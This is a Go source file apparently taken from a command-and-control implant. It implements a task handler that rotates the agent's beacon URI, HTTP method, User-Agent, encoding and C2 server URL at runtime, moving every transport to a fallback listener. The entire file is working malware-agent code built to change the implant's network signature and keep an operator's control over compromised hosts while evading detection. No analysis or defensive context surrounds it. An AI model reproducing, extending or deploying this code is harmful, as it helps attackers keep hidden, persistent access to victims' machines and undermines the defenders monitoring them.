//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/json"
	"strings"
	"sync"
)

// ProfileRotation defines a new C2 profile to switch to at runtime.
// When an agent receives this task, it switches to the new beacon URI,
// HTTP method, User-Agent, and encoding format on the next beacon cycle.
type ProfileRotation struct {
	BeaconURI    string `json:"beacon_uri"`
	BeaconMethod string `json:"beacon_method"`
	UserAgent    string `json:"user_agent"`
	Encoding     string `json:"encoding"` // "json", "msgpack", "cbor"
	C2URL        string `json:"c2_url"`
}

var profileOverrides struct {
	sync.RWMutex
	beaconURI    string
	beaconMethod string
	userAgent    string
	encoding     string
	c2URL        string
}

func handleProfileRotate(task Task, res *TaskResult) {
	if task.Data == "" {
		res.Error = "profile_rotate: empty data"
		return
	}
	var pr ProfileRotation
	if err := json.Unmarshal([]byte(task.Data), &pr); err != nil {
		res.Error = "profile_rotate: invalid json: " + err.Error()
		return
	}
	profileOverrides.Lock()
	defer profileOverrides.Unlock()
	if pr.BeaconURI != "" {
		profileOverrides.beaconURI = pr.BeaconURI
	}
	if pr.BeaconMethod != "" {
		profileOverrides.beaconMethod = strings.ToUpper(pr.BeaconMethod)
	}
	if pr.UserAgent != "" {
		profileOverrides.userAgent = pr.UserAgent
	}
	if pr.Encoding != "" {
		switch pr.Encoding {
		case "json", "msgpack", "cbor":
			profileOverrides.encoding = pr.Encoding
		}
	}
	if pr.C2URL != "" {
		// Redirect all transports to the new C2 endpoint. sendToC2 builds the
		// final URL as C2URLs[idx] + beaconURI, so replacing the list moves
		// every transport (HTTP/mTLS/gRPC/WSS/...) to the fallback listener.
		profileOverrides.c2URL = pr.C2URL
		c2URLsStore([]string{pr.C2URL}, 0)
	}
	res.Output = "profile rotated"
}

func getActiveBeaconURI() string {
	profileOverrides.RLock()
	uri := profileOverrides.beaconURI
	profileOverrides.RUnlock()
	if uri != "" {
		return uri
	}
	return BeaconURI
}

func getActiveBeaconMethod() string {
	profileOverrides.RLock()
	method := profileOverrides.beaconMethod
	profileOverrides.RUnlock()
	if method != "" {
		return method
	}
	return BeaconMethod
}

func getActiveUserAgent() string {
	profileOverrides.RLock()
	ua := profileOverrides.userAgent
	profileOverrides.RUnlock()
	if ua != "" {
		return ua
	}
	return UserAgent
}

func getActiveEncoding() string {
	profileOverrides.RLock()
	defer profileOverrides.RUnlock()
	return profileOverrides.encoding
}
